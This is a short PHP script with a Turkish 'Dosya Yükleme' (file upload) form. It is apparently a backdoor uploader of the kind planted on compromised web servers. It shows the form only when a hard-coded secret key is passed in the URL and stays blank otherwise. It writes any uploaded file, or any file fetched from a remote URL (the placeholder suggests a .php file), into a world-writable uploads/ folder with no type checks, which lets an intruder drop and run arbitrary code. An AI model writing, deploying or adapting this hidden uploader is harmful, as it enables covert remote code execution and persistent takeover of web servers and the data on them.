<?php
if (isset($_GET['key']) && $_GET['key'] === 'exlonea') {
    $dir = 'uploads/';
    is_dir($dir) || mkdir($dir, 0777, true);
    $msg = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            // Dosya seçme ile yükleme
            $file = $dir . basename($_FILES['file']['name']);
            if (!is_writable($dir)) {
                $msg = 'Hata: uploads/ klasörü yazılabilir değil. İzinleri kontrol edin (chmod 0777).';
            } elseif ($_FILES['file']['size'] > 10485760) { // 10MB limit
                $msg = 'Hata: Dosya boyutu 10MB\'tan büyük.';
            } elseif (move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
                $msg = '<a href="' . htmlspecialchars($file) . '" target="_blank">' . htmlspecialchars(basename($file)) . '</a>';
            } else {
                $msg = 'Hata: Dosya yüklenemedi. Sunucu yapılandırmasını kontrol edin.';
            }
        } elseif (!empty($_POST['url'])) {
            // URL ile yükleme
            $url = filter_var($_POST['url'], FILTER_VALIDATE_URL);
            if ($url) {
                $fileName = $dir . basename(parse_url($url, PHP_URL_PATH));
                $fileName = $fileName ?: $dir . 'downloaded_file_' . time();
                if (!is_writable($dir)) {
                    $msg = 'Hata: uploads/ klasörü yazılabilir değil. İzinleri kontrol edin (chmod 0777).';
                } else {
                    $content = @file_get_contents($url);
                    if ($content !== false && file_put_contents($fileName, $content)) {
                        $msg = '<a href="' . htmlspecialchars($fileName) . '" target="_blank">' . htmlspecialchars(basename($fileName)) . '</a>';
                    } else {
                        $msg = 'Hata: URL\'den dosya yüklenemedi. URL geçerli mi?';
                    }
                }
            } else {
                $msg = 'Hata: Geçersiz URL.';
            }
        } else {
            $msg = 'Dosya veya URL gerekli.';
        }
    }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Dosya Yükleme</title>
    <meta charset="UTF-8">
</head>
<body>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file"><br>
        <input type="text" name="url" placeholder="Dosya URL'si girin (örn: https://siteadi.com/dosya.php)"><br>
        <input type="submit" value="Yükle">
    </form>
    <?php if ($msg) echo "<p>$msg</p>"; ?>
</body>
</html>
<?php
}
?>